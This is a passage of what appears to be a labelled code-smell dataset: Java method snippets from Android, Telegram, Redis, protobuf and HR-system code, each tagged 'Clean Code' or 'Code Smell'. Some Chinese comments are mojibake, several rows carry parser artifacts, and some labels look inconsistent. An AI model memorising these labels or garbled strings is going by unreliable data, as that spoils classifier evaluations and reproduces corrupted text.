  if (mAllComponents == null) {
    Map<ComponentInfo,Integer> components=new LinkedHashMap<>();
    if (mPackageInfo.activities != null) {
      for (      ActivityInfo info : mPackageInfo.activities) {
        components.put(info,ComponentsOption.COMPONENT_TYPE_ACTIVITY);
      }
    }
    if (mPackageInfo.services != null) {
      for (      ServiceInfo info : mPackageInfo.services) {
        components.put(info,ComponentsOption.COMPONENT_TYPE_SERVICE);
      }
    }
    if (mPackageInfo.receivers != null) {
      for (      ActivityInfo info : mPackageInfo.receivers) {
        components.put(info,ComponentsOption.COMPONENT_TYPE_RECEIVER);
      }
    }
    if (mPackageInfo.providers != null) {
      for (      ProviderInfo info : mPackageInfo.providers) {
        components.put(info,ComponentsOption.COMPONENT_TYPE_PROVIDER);
      }
    }
    mAllComponents=components;
  }
  return mAllComponents;
}
",0,Clean Code
"@Override public void onChange(boolean selfChange,@Nullable Uri uri){
  super.onChange(selfChange,uri);
  if (uri != null) {
    String uriString=uri.toString();
    String mUriString=Settings.System.getUriFor(screenBrightnessCustomMode).toString();
    if (uriString.equals(mUriString)) {
      if (getBrightnessMode(mContext) == 0 && getCustomBrightnessMode(mContext) == 0) {
        setBrightnessMode(mContext,1);
      }
 else       if (getBrightnessMode(mContext) == 1 && getCustomBrightnessMode(mContext) == 1) {
        setBrightnessMode(mContext,0);
      }
    }
  }
  refreshState(param.thisObject);
}",0,Clean Code
"@Override public Long hset(final String key,final String field,final String value){
  try {
    return redis.hset(key,field,value) ? 1L : 0L;
  }
 catch (  Exception e) {
    throw new JedisException(e);
  }
}",0,Clean Code
"MistralAiApiKeyInterceptor(String apiKey){
  this.apiKey=apiKey;
}
",0,Clean Code
"/** 
 * <code>optional int64 time = 9;</code>
 * @return the time
 */
public long getTime(){
  return time;
}",0,Clean Code
"@PostMapping(""/queryChangeTemplateList"") @ApiOperation(""鏌ヨ妯℃澘鍒楄〃"") public Result<List<QueryChangeTemplateListVO>> queryChangeTemplateList(){
  List<QueryChangeTemplateListVO> list=salaryChangeTemplateService.queryChangeTemplateList();
  return Result.ok(list);
}
",0,Clean Code
"public void setChatReactions(long chatId,int type,List<String> reactions){
  TLRPC.TL_messages_setChatAvailableReactions req=new TLRPC.TL_messages_setChatAvailableReactions();
  req.peer=getInputPeer(-chatId);
  if (type == ChatReactionsEditActivity.SELECT_TYPE_NONE) {
    req.available_reactions=new TLRPC.TL_chatReactionsNone();
  }
 else   if (type == ChatReactionsEditActivity.SELECT_TYPE_ALL) {
    req.available_reactions=new TLRPC.TL_chatReactionsAll();
  }
 else {
    TLRPC.TL_chatReactionsSome someReactions=new TLRPC.TL_chatReactionsSome();
    req.available_reactions=someReactions;
    for (int i=0; i < reactions.size(); i++) {
      TLRPC.TL_reactionEmoji emojiReaction=new TLRPC.TL_reactionEmoji();
      emojiReaction.emoticon=reactions.get(i);
      someReactions.reactions.add(emojiReaction);
    }
  }
  getConnectionsManager().sendRequest(req,(response,error) -> {
    if (response != null) {
      processUpdates((TLRPC.Updates)response,false);
      TLRPC.ChatFull full=getChatFull(chatId);
      if (full != null) {
        if (full instanceof TLRPC.TL_chatFull) {
          full.flags|=262144;
        }
        if (full instanceof TLRPC.TL_channelFull) {
          full.flags|=1073741824;
        }
        full.available_reactions=req.available_reactions;
        getMessagesStorage().updateChatInfo(full,false);
      }
      AndroidUtilities.runOnUIThread(() -> getNotificationCenter().postNotificationName(NotificationCenter.chatAvailableReactionsUpdated,chatId,0));
    }
  }
);
}",1,Code Smell
"@Override public Set<String> zrange(String key,long start,long end){
  return jedisCluster.zrange(key,start,end);
}
",0,Clean Code
"@Override public IMouseStateChange mousePressed(final MouseEvent event,final AbstractZyGraph<?,?> graph){
  return new CStateChange(m_factory.createDefaultState(),true);
}
",0,Clean Code
"public static String deepToString(Object value){
  if (value != null && value.getClass().isArray()) {
    if (value.getClass() == boolean[].class) {
      return Arrays.toString((boolean[])value);
    }
 else     if (value.getClass() == byte[].class) {
      return Arrays.toString((byte[])value);
    }
 else     if (value.getClass() == char[].class) {
      return Arrays.toString((char[])value);
    }
 else     if (value.getClass() == double[].class) {
      return Arrays.toString((double[])value);
    }
 else     if (value.getClass() == float[].class) {
      return Arrays.toString((float[])value);
    }
 else     if (value.getClass() == int[].class) {
      return Arrays.toString((int[])value);
    }
 else     if (value.getClass() == long[].class) {
      return Arrays.toString((long[])value);
    }
 else     if (value.getClass() == short[].class) {
      return Arrays.toString((short[])value);
    }
 else {
      return Arrays.deepToString((Object[])value);
    }
  }
 else {
    return String.valueOf(value);
  }
}
",0,Clean Code
"@Override public List<ITreeNode<ObjectType>> getChildren(){
  return new ArrayList<ITreeNode<ObjectType>>(m_children);
}
",0,Clean Code
"@Override public TextJoinQueryScRsp clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  textJoinList.clearQuick();
  return this;
}",0,Clean Code
"/** 
 * 鏌ヨ鍟嗘満淇℃伅
 * @param ids ids
 * @return entity
 */
@PostMapping(""/crmBusiness/querySimpleEntity"") public Result<List<SimpleCrmEntity>> queryBusinessInfo(@RequestBody Collection ids);
",0,Clean Code
"public GGProFDLEntry(GProFDLEntry gProFDLEntry){
  this.mInfo=gProFDLEntry;
}
",0,Clean Code
"@Override public boolean getNoLoopInfo(){
  return this.mInfo.getNoLoopInfo();
}
",0,Clean Code
"public static GetAvatarDataScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new GetAvatarDataScRsp(),data).checkInitialized();
}
public static GetAvatarDataScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new GetAvatarDataScRsp(),input).checkInitialized();
}
public static GetAvatarDataScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new GetAvatarDataScRsp(),input).checkInitialized();
}
",0,Clean Code
"@Override @SuppressLint(""NonConstantResourceId"") public void onIconClick(int resId){
  StringBuilder sb=new StringBuilder(binding.keyword.getText().toString());
  int cursor=binding.keyword.getSelectionStart();
switch (resId) {
case R.drawable.ic_setting_home:
    callback.showDialog();
  break;
case R.drawable.ic_keyboard_left:
binding.keyword.setSelection(--cursor < 0 ? 0 : cursor);
break;
case R.drawable.ic_keyboard_right:
binding.keyword.setSelection(++cursor > binding.keyword.length() ? binding.keyword.length() : cursor);
break;
case R.drawable.ic_keyboard_back:
if (cursor == 0) return;
sb.deleteCharAt(cursor - 1);
binding.keyword.setText(sb.toString());
binding.keyword.setSelection(cursor - 1);
break;
case R.drawable.ic_keyboard_remote:
callback.onRemote();
break;
case R.drawable.ic_keyboard_search:
callback.onSearch();
break;
}
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(itemCostList);
  }
  return size;
}",0,Clean Code
"public static String pageRender(){
  return RpcUtil.request(""com.alipay.insplatformbff.common.insiopService.pageRender"",""[\""INS_PLATFORM_BLUEBEAN\"",{\""channelType\"":\""insplatform_mobilesearch_anxindou\""}]"");
}
",0,Clean Code
"/** 
 * inputArrayData.type() must be multi-dimension array or Collection, not allowed to be primitive array
 */
public ArrayDataForEach(Expression inputArrayData,TypeRef<?> elemType,SerializableBiFunction<Expression,Expression,Expression> notNullAction){
  this(inputArrayData,elemType,notNullAction,null);
}
/** 
 * inputArrayData.type() must be multi-dimension array or Collection, not allowed to be primitive array
 */
public ArrayDataForEach(Expression inputArrayData,TypeRef<?> elemType,SerializableBiFunction<Expression,Expression,Expression> notNullAction,SerializableFunction<Expression,Expression> nullAction){
  Preconditions.checkArgument(getRawType(inputArrayData.type()) == BinaryArray.class);
  this.inputArrayData=inputArrayData;
  this.accessMethod=BinaryUtils.getElemAccessMethodName(elemType);
  this.elemType=BinaryUtils.getElemReturnType(elemType);
  this.notNullAction=notNullAction;
  this.nullAction=nullAction;
}
",0,Clean Code
"public static int getData(TimeType tt,DataType dt){
  Statistics stat=getStatistics();
  int data=0;
  TimeStatistics ts=null;
switch (tt) {
case YEAR:
    ts=stat.year;
  break;
case MONTH:
ts=stat.month;
break;
case DAY:
ts=stat.day;
break;
}
if (ts != null) switch (dt) {
case TIME:
data=ts.time;
break;
case COLLECTED:
data=ts.collected;
break;
case HELPED:
data=ts.helped;
break;
case WATERED:
data=ts.watered;
break;
}
return data;
}",0,Clean Code
"public Integer getDownSize(){
  return this.downSize;
}
",0,Clean Code
"/** 
 * <code>optional uint32 base_avatar_id = 14;</code>
 * @return this
 */
public Avatar clearBaseAvatarId(){
  bitField0_&=~0x00000040;
  baseAvatarId=0;
  return this;
}",0,Clean Code
"/** 
 * Get the promptTokens property: The number of tokens in the provided prompts for the completions request.
 * @return the promptTokens value.
 */
public int getPromptTokens(){
  return this.promptTokens;
}
",0,Clean Code
"private PredictionImplProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private PredictionImplProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@2be68c79",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  float x=(getRight() - getLeft()) / 2 + textOffset;
  float y=mCurrentScrollOffset;
  int[] selectorIndices=mSelectorIndices;
  for (int i=0; i < selectorIndices.length; i++) {
    int selectorIndex=selectorIndices[i];
    String scrollSelectorValue=mSelectorIndexToStringCache.get(selectorIndex);
    if (scrollSelectorValue != null && (i != SELECTOR_MIDDLE_ITEM_INDEX || mInputText.getVisibility() != VISIBLE)) {
      if (SELECTOR_WHEEL_ITEM_COUNT > 3) {
        float p;
        float cY=getMeasuredHeight() / 2f;
        float r=getMeasuredHeight() * 0.5f;
        float localY=y - mSelectorWheelPaint.getTextSize() / 2f;
        boolean top=true;
        if (localY < cY) {
          p=localY / r;
        }
 else {
          p=(getMeasuredHeight() - localY) / r;
          top=false;
        }
        p=interpolator.getInterpolation(Utilities.clamp(p,1f,0));
        float yOffset=(1f - p) * mSelectorWheelPaint.getTextSize();
        if (!top) {
          yOffset=-yOffset;
        }
        int oldAlpha=-1;
        canvas.save();
        canvas.translate(0,yOffset);
        canvas.scale(0.8f + p * 0.2f,p,x,localY);
        if (p < 0.1f) {
          oldAlpha=mSelectorWheelPaint.getAlpha();
          mSelectorWheelPaint.setAlpha((int)(oldAlpha * p / 0.1f));
        }
        canvas.drawText(scrollSelectorValue,x,y,mSelectorWheelPaint);
        canvas.restore();
        if (oldAlpha != -1) {
          mSelectorWheelPaint.setAlpha(oldAlpha);
        }
      }
 else {
        canvas.drawText(scrollSelectorValue,x,y,mSelectorWheelPaint);
      }
    }
    y+=mSelectorElementHeight;
  }
  if (drawDividers) {
    int topOfTopDivider=mTopSelectionDividerTop;
    int bottomOfTopDivider=topOfTopDivider + mSelectionDividerHeight;
    canvas.drawRect(0,topOfTopDivider,getRight(),bottomOfTopDivider,mSelectionDivider);
    int bottomOfBottomDivider=mBottomSelectionDividerBottom;
    int topOfBottomDivider=bottomOfBottomDivider - mSelectionDividerHeight;
    canvas.drawRect(0,topOfBottomDivider,getRight(),bottomOfBottomDivider,mSelectionDivider);
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 entry_id = 9;</code>
 * @return the entryId
 */
public int getEntryId(){
  return entryId;
}",0,Clean Code
"@Override public int getContentResId(){
  return R.xml.framework;
}
",0,Clean Code
"@Override public SyncClientResVersionCsReq clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  clientResVersion=0;
  return this;
}",0,Clean Code
"@Override protected int getItemType(@NotNull List<? extends BaseCustomViewModel> data,int position){
  if (data.get(position) instanceof TopBannerViewModel) {
    return IDisCoverItemType.TOP_BANNER_VIEW;
  }
 else   if (data.get(position) instanceof CategoryCardBean) {
    return IDisCoverItemType.CATEGORY_CARD_VIEW;
  }
 else   if (data.get(position) instanceof SubjectCardBean) {
    return IDisCoverItemType.SUBJECT_CARD_VIEW;
  }
 else   if (data.get(position) instanceof TitleViewModel) {
    return IDisCoverItemType.TITLE_VIEW;
  }
 else   if (data.get(position) instanceof ContentBannerViewModel) {
    return IDisCoverItemType.CONTENT_BANNER_VIEW;
  }
 else   if (data.get(position) instanceof VideoCardViewModel) {
    return IDisCoverItemType.VIDEO_CARD_VIEW;
  }
 else   if (data.get(position) instanceof BriefCardViewModel) {
    return IDisCoverItemType.THEME_CARD_VIEW;
  }
  return -1;
}",0,Clean Code
"String getGuildFace();
",0,Clean Code
"@Override public SearchPlayerScRsp copyFrom(final SearchPlayerScRsp other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    retcode=other.retcode;
    searchResultList.copyFrom(other.searchResultList);
  }
  return this;
}",0,Clean Code
"/** 
 * @return factory for creating ExchangeGachaCeilingScRsp messages
 */
public static MessageFactory<ExchangeGachaCeilingScRsp> getFactory(){
  return ExchangeGachaCeilingScRspFactory.INSTANCE;
}
",0,Clean Code
"@Override public GetJukeboxDataCsReq clone(){
  return new GetJukeboxDataCsReq().copyFrom(this);
}
",0,Clean Code
"/** 
 * <code>optional uint32 server_prefs_id = 11;</code>
 * @return whether the serverPrefsId field is set
 */
public boolean hasServerPrefsId(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"private TransformedModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private TransformedModelProto(){
  featureNames_=com.google.protobuf.LazyStringArrayList.EMPTY;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@49a453ea",0,Clean Code
"public void addMCoin(int amount){
  int newAmount=Utils.safeAdd(this.mcoin,amount);
  if (this.mcoin != newAmount) {
    this.mcoin=newAmount;
    this.sendPacket(new PacketPlayerSyncScNotify(this));
  }
}
",0,Clean Code
"public ClassInfo newClassInfo(Class<?> cls,Serializer<?> serializer,short classId){
  return new ClassInfo(this,cls,null,serializer,classId);
}
",0,Clean Code
"@Override public void actionPerformed(ActionEvent e){
  if (undoManager != null && undoManager.canUndo()) {
    undoManager.undo();
  }
}
@Override public void actionPerformed(ActionEvent e){
  if (undoManager != null && undoManager.canRedo()) {
    undoManager.redo();
  }
}
@Override public void actionPerformed(ActionEvent e){
  getTextComponent(e).replaceSelection("""");
}
@Override public void actionPerformed(ActionEvent e){
  getTextComponent(e).selectAll();
}
",0,Clean Code
"public TLRPC.TL_messages_savedReactionsTags getSavedReactionTags(long topic_id){
  return getSavedReactionTags(topic_id,false);
}
public TLRPC.TL_messages_savedReactionsTags getSavedReactionTags(long topic_id,boolean force){
  if (loadingReactionTags != null && loadingReactionTags.contains(topic_id) && !force) {
    if (reactionTags == null)     return null;
    return reactionTags.get(topic_id);
  }
  if (loadingReactionTags == null) {
    loadingReactionTags=new HashSet<>();
  }
  loadingReactionTags.add(topic_id);
  getMessagesStorage().getStorageQueue().postRunnable(() -> {
    TLRPC.messages_SavedReactionTags result=null;
    SQLiteDatabase database=getMessagesStorage().getDatabase();
    SQLiteCursor cursor=null;
    try {
      cursor=database.queryFinalized(""SELECT data FROM saved_reaction_tags WHERE topic_id = ?"",topic_id);
      if (cursor.next()) {
        NativeByteBuffer data=cursor.byteBufferValue(0);
        if (data != null) {
          result=TLRPC.messages_SavedReactionTags.TLdeserialize(data,data.readInt32(true),true);
        }
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
 finally {
      if (cursor != null) {
        cursor.dispose();
        cursor=null;
      }
    }
    final TLRPC.messages_SavedReactionTags finalResult=result;
    AndroidUtilities.runOnUIThread(() -> {
      if (reactionTags == null)       reactionTags=new LongSparseArray<>();
      if (finalResult instanceof TLRPC.TL_messages_savedReactionsTags) {
        reactionTags.put(topic_id,(TLRPC.TL_messages_savedReactionsTags)finalResult);
        getNotificationCenter().postNotificationName(NotificationCenter.savedReactionTagsUpdate,topic_id);
      }
      TLRPC.TL_messages_getSavedReactionTags req=new TLRPC.TL_messages_getSavedReactionTags();
      if (finalResult instanceof TLRPC.TL_messages_savedReactionsTags) {
        req.hash=finalResult.hash;
      }
      if (topic_id != 0) {
        req.flags|=1;
        req.peer=getInputPeer(topic_id);
      }
      getConnectionsManager().sendRequest(req,(res,err) -> AndroidUtilities.runOnUIThread(() -> {
        if (res instanceof TLRPC.TL_messages_savedReactionsTags) {
          TLRPC.TL_messages_savedReactionsTags tags=(TLRPC.TL_messages_savedReactionsTags)res;
          reactionTags.put(topic_id,tags);
          getNotificationCenter().postNotificationName(NotificationCenter.savedReactionTagsUpdate,topic_id);
          saveSavedReactionsTags(topic_id,tags);
        }
 else         if (res instanceof TLRPC.TL_messages_savedReactionsTagsNotModified && finalResult == null && req.hash == 0) {
          TLRPC.TL_messages_savedReactionsTags emptyTags=new TLRPC.TL_messages_savedReactionsTags();
          reactionTags.put(topic_id,emptyTags);
          getNotificationCenter().postNotificationName(NotificationCenter.savedReactionTagsUpdate,topic_id);
          saveSavedReactionsTags(topic_id,emptyTags);
        }
      }
));
    }
);
  }
);
  return null;
}",1,Code Smell
"public static Object getDefaultValueObject(Class<?> type){
  if (type.isPrimitive()) {
    if (type.equals(byte.class)) {
      return Byte.valueOf((byte)0);
    }
 else     if (type.equals(char.class)) {
      return Character.valueOf('\0');
    }
 else     if (type.equals(short.class)) {
      return Short.valueOf((short)0);
    }
 else     if (type.equals(int.class)) {
      return Integer.valueOf(0);
    }
 else     if (type.equals(long.class)) {
      return Long.valueOf(0L);
    }
 else     if (type.equals(float.class)) {
      return Float.valueOf(0.0f);
    }
 else     if (type.equals(double.class)) {
      return Double.valueOf(0.0);
    }
 else     if (type.equals(boolean.class)) {
      return Boolean.valueOf(false);
    }
 else     if (type.equals(void.class)) {
      return null;
    }
 else {
      throw new IllegalArgumentException(""Unhandled primitive type: "" + type);
    }
  }
  return null;
}",0,Clean Code
"static byte[] decodeBase64(byte[] base64Data){
  base64Data=discardNonBase64(base64Data);
  if (base64Data.length == 0)   return new byte[0];
  int numberQuadruple=base64Data.length / 4;
  byte[] decodedData=(byte[])null;
  byte b1=0, b2=0, b3=0, b4=0, marker0=0, marker1=0;
  int encodedIndex=0;
  int dataIndex=0;
  int lastData=base64Data.length;
  while (base64Data[lastData - 1] == 61) {
    if (--lastData == 0)     return new byte[0];
  }
  decodedData=new byte[lastData - numberQuadruple];
  for (int i=0; i < numberQuadruple; i++) {
    dataIndex=i * 4;
    marker0=base64Data[dataIndex + 2];
    marker1=base64Data[dataIndex + 3];
    b1=base64Alphabet[base64Data[dataIndex]];
    b2=base64Alphabet[base64Data[dataIndex + 1]];
    if (marker0 != 61 && marker1 != 61) {
      b3=base64Alphabet[marker0];
      b4=base64Alphabet[marker1];
      decodedData[encodedIndex]=(byte)(b1 << 2 | b2 >> 4);
      decodedData[encodedIndex + 1]=(byte)((b2 & 0xF) << 4 | b3 >> 2 & 0xF);
      decodedData[encodedIndex + 2]=(byte)(b3 << 6 | b4);
    }
 else     if (marker0 == 61) {
      decodedData[encodedIndex]=(byte)(b1 << 2 | b2 >> 4);
    }
 else     if (marker1 == 61) {
      b3=base64Alphabet[marker0];
      decodedData[encodedIndex]=(byte)(b1 << 2 | b2 >> 4);
      decodedData[encodedIndex + 1]=(byte)((b2 & 0xF) << 4 | b3 >> 2 & 0xF);
    }
    encodedIndex+=3;
  }
  return decodedData;
}",0,Clean Code
"/** 
 * <code>optional uint32 level = 10;</code>
 * @return the level
 */
public int getLevel(){
  return level;
}",0,Clean Code
"public static StartCocoonStageCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new StartCocoonStageCsReq(),data).checkInitialized();
}
public static StartCocoonStageCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new StartCocoonStageCsReq(),input).checkInitialized();
}
public static StartCocoonStageCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new StartCocoonStageCsReq(),input).checkInitialized();
}
",0,Clean Code
"Property<String> getOutputFormat();
",0,Clean Code
"@Override public String toString(){
  return ""UpdateSalaryBO{"" + ""sEmpRecordId="" + sEmpRecordId + "", salaryValues=""+ salaryValues+ '}';
}
",0,Clean Code
"private String employeeStatusName(Integer employeeStatus){
  String statusName="""";
switch (employeeStatus) {
case 1:
    statusName=""姝ｅ紡"";
  break;
case 2:
statusName=""璇曠敤"";
break;
case 3:
statusName=""瀹炰範"";
break;
case 4:
statusName=""鍏艰亴"";
break;
case 5:
statusName=""鍔冲姟"";
break;
case 6:
statusName=""椤鹃棶"";
break;
case 7:
statusName=""杩旇仒"";
break;
case 8:
statusName=""澶栧寘"";
break;
}
return statusName;
}",0,Clean Code
"@Override public long getPosition(){
  return bb.position();
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.test.protos.TestCountTransformerProto)) {
    return super.equals(obj);
  }
  org.tribuo.test.protos.TestCountTransformerProto other=(org.tribuo.test.protos.TestCountTransformerProto)obj;
  if (getCount() != other.getCount())   return false;
  if (getSparseCount() != other.getSparseCount())   return false;
  if (!getCountMapKeysList().equals(other.getCountMapKeysList()))   return false;
  if (!getCountMapValuesList().equals(other.getCountMapValuesList()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"/** 
 * <code>optional uint32 num = 14;</code>
 * @return whether the num field is set
 */
public boolean hasNum(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"public void update(long dialogId,int topicId,HashSet<Integer> topicExceptions){
  if (System.currentTimeMillis() - lastDismissTime < 200) {
    AndroidUtilities.runOnUIThread(() -> {
      update(dialogId,topicId,topicExceptions);
    }
);
    return;
  }
  boolean muted=MessagesController.getInstance(currentAccount).isDialogMuted(dialogId,topicId);
  int color;
  if (muted) {
    muteUnmuteButton.setTextAndIcon(LocaleController.getString(""UnmuteNotifications"",R.string.UnmuteNotifications),R.drawable.msg_unmute);
    color=Theme.getColor(Theme.key_windowBackgroundWhiteGreenText2);
    soundToggle.setVisibility(View.GONE);
  }
 else {
    muteUnmuteButton.setTextAndIcon(LocaleController.getString(""MuteNotifications"",R.string.MuteNotifications),R.drawable.msg_mute);
    color=Theme.getColor(Theme.key_dialogTextRed);
    soundToggle.setVisibility(View.VISIBLE);
    boolean soundOn=MessagesController.getInstance(currentAccount).isDialogNotificationsSoundEnabled(dialogId,topicId);
    if (soundOn) {
      soundToggle.setTextAndIcon(LocaleController.getString(""SoundOff"",R.string.SoundOff),R.drawable.msg_tone_off);
    }
 else {
      soundToggle.setTextAndIcon(LocaleController.getString(""SoundOn"",R.string.SoundOn),R.drawable.msg_tone_on);
    }
  }
  if (type == TYPE_PREVIEW_MENU) {
    backItem.setVisibility(View.GONE);
  }
  int time1;
  int time2;
  if (muted || type == TYPE_PREVIEW_MENU) {
    time1=0;
    time2=0;
  }
 else {
    SharedPreferences sharedPreferences=MessagesController.getNotificationsSettings(currentAccount);
    time1=sharedPreferences.getInt(LAST_SELECTED_TIME_KEY_1,0);
    time2=sharedPreferences.getInt(LAST_SELECTED_TIME_KEY_2,0);
  }
  if (time1 != 0) {
    muteForLastSelected1Time=time1;
    muteForLastSelected.setVisibility(View.VISIBLE);
    muteForLastSelected.getImageView().setImageDrawable(TimerDrawable.getTtlIcon(time1));
    muteForLastSelected.setText(formatMuteForTime(time1));
  }
 else {
    muteForLastSelected.setVisibility(View.GONE);
  }
  if (time2 != 0) {
    muteForLastSelected2Time=time2;
    muteForLastSelected2.setVisibility(View.VISIBLE);
    muteForLastSelected2.getImageView().setImageDrawable(TimerDrawable.getTtlIcon(time2));
    muteForLastSelected2.setText(formatMuteForTime(time2));
  }
 else {
    muteForLastSelected2.setVisibility(View.GONE);
  }
  muteUnmuteButton.setColors(color,color);
  muteUnmuteButton.setSelectorColor(Theme.multAlpha(color,.1f));
  if (topicExceptions == null || topicExceptions.isEmpty()) {
    gap.setVisibility(View.GONE);
    topicsExceptionsTextView.setVisibility(View.GONE);
  }
 else {
    gap.setVisibility(View.VISIBLE);
    topicsExceptionsTextView.setVisibility(View.VISIBLE);
    topicsExceptionsTextView.setText(AndroidUtilities.replaceSingleTag(LocaleController.formatPluralString(""TopicNotificationsExceptions"",topicExceptions.size()),Theme.key_windowBackgroundWhiteBlueText,AndroidUtilities.REPLACING_TAG_TYPE_BOLD,null));
  }
}",0,Clean Code
"private void checkGridVisibility(int position,float positionOffset){
  if (stickersContainer == null || gifContainer == null) {
    return;
  }
  if (position == 0) {
    emojiGridView.setVisibility(View.VISIBLE);
    gifGridView.setVisibility(positionOffset == 0 ? View.GONE : View.VISIBLE);
    gifTabs.setVisibility(positionOffset == 0 ? View.GONE : View.VISIBLE);
    stickersGridView.setVisibility(View.GONE);
    if (stickersTabContainer != null) {
      stickersTabContainer.setVisibility(View.GONE);
    }
  }
 else   if (position == 1) {
    emojiGridView.setVisibility(View.GONE);
    gifGridView.setVisibility(View.VISIBLE);
    gifTabs.setVisibility(View.VISIBLE);
    stickersGridView.setVisibility(positionOffset == 0 ? View.GONE : View.VISIBLE);
    if (stickersTabContainer != null) {
      stickersTabContainer.setVisibility(positionOffset == 0 ? View.GONE : View.VISIBLE);
    }
  }
 else   if (position == 2) {
    emojiGridView.setVisibility(View.GONE);
    gifGridView.setVisibility(View.GONE);
    gifTabs.setVisibility(View.GONE);
    stickersGridView.setVisibility(View.VISIBLE);
    if (stickersTabContainer != null) {
      stickersTabContainer.setVisibility(View.VISIBLE);
    }
  }
}",0,Clean Code
"void onResult(int code,String msg,TempChatInfo info);
",0,Clean Code
"private OutputFactoryProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private OutputFactoryProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@25c9fe49",0,Clean Code
"public Builder addSystemMessage(String systemMessage){
  if (this.messages == null) {
    this.messages=new ArrayList<>();
  }
  this.messages.add(SystemMessage.from(systemMessage));
  return this;
}
",0,Clean Code
"private static Pair<Integer,String> post(Request request){
  String result;
  int errorCode=0;
  HttpURLConnection connection=null;
  InputStream is=null;
  try {
    URL url=new URL(request.url);
    connection=(HttpURLConnection)url.openConnection();
    connection.setRequestMethod(request.method);
    connection.setUseCaches(false);
    connection.setConnectTimeout(request.timeout);
    connection.setReadTimeout(request.timeout);
    connection.setInstanceFollowRedirects(true);
    if (request.method.equals(""POST"")) {
      connection.setDoInput(true);
      connection.setDoOutput(true);
      connection.setChunkedStreamingMode(0);
    }
    connection.setRequestProperty(""Charset"",""UTF-8"");
    connection.setRequestProperty(""Content-Type"",""application/x-www-form-urlencoded"");
    connection.setRequestProperty(""Cookie"",""os=android"");
    if (request.header != null)     for (    Map.Entry<String,Object> entry : request.header.entrySet()) {
      connection.setRequestProperty(entry.getKey(),entry.getValue().toString());
    }
    connection.connect();
    if (request.method.equals(""POST"") && !TextUtils.isEmpty(request.param)) {
      DataOutputStream out=new DataOutputStream(connection.getOutputStream());
      out.writeBytes(request.param);
      out.flush();
      out.close();
    }
    if (connection.getResponseCode() == HttpURLConnection.HTTP_OK)     is=connection.getInputStream();
 else {
      is=connection.getErrorStream();
      errorCode=connection.getResponseCode();
    }
    BufferedReader reader=new BufferedReader(new InputStreamReader(is,""UTF-8""));
    StringBuilder response=new StringBuilder();
    String line;
    while ((line=reader.readLine()) != null) {
      response.append(line);
    }
    result=response.toString();
  }
 catch (  SocketException e) {
    errorCode=2;
    e.printStackTrace();
    result=e.getMessage();
  }
catch (  OutOfMemoryError e) {
    errorCode=3;
    e.printStackTrace();
    result=e.getMessage();
  }
catch (  SocketTimeoutException e) {
    errorCode=4;
    e.printStackTrace();
    result=e.getMessage();
  }
catch (  Exception e) {
    e.printStackTrace();
    errorCode=-1;
    result=e.getMessage();
  }
 finally {
    if (connection != null) {
      connection.disconnect();
    }
    if (is != null) {
      try {
        is.close();
      }
 catch (      IOException e) {
        e.printStackTrace();
      }
    }
  }
  return new Pair<>(errorCode,result);
}",0,Clean Code
"/** 
 * 杞崲涓築igDecimal<br> 濡傛灉缁欏畾鐨勫�间负绌猴紝鎴栬�呰浆鎹㈠け璐ワ紝杩斿洖榛樿鍊�<br> 杞崲澶辫触涓嶄細鎶ラ敊
 * @param value        琚浆鎹㈢殑鍊�
 * @param defaultValue 杞崲閿欒鏃剁殑榛樿鍊�
 * @return 缁撴灉
 */
public static BigDecimal toBigDecimal(Object value,BigDecimal defaultValue){
  if (value == null) {
    return defaultValue;
  }
  if (value instanceof BigDecimal) {
    return (BigDecimal)value;
  }
  if (value instanceof Long) {
    return new BigDecimal((Long)value);
  }
  if (value instanceof Double) {
    return new BigDecimal((Double)value);
  }
  if (value instanceof Integer) {
    return new BigDecimal((Integer)value);
  }
  final String valueStr=toStr(value,null);
  if (StringUtils.isEmpty(valueStr)) {
    return defaultValue;
  }
  try {
    return new BigDecimal(valueStr);
  }
 catch (  Exception e) {
    return defaultValue;
  }
}
/** 
 * 杞崲涓築igDecimal<br> 濡傛灉缁欏畾鐨勫�间负绌猴紝鎴栬�呰浆鎹㈠け璐ワ紝杩斿洖榛樿鍊�<br> 杞崲澶辫触涓嶄細鎶ラ敊
 * @param value 琚浆鎹㈢殑鍊�
 * @return 缁撴灉
 */
public static BigDecimal toBigDecimal(Object value){
  return toBigDecimal(value,null);
}
",0,Clean Code
"ArrayList<IGProRecommendPopupAdsInfo> getAdsInfoList();
",0,Clean Code
"/** 
 * <code>optional bool b3 = 4;</code>
 * @param value the b3 to set
 * @return this
 */
public PlayerSettingInfo setB3(final boolean value){
  bitField0_|=0x00000008;
  b3=value;
  return this;
}",0,Clean Code
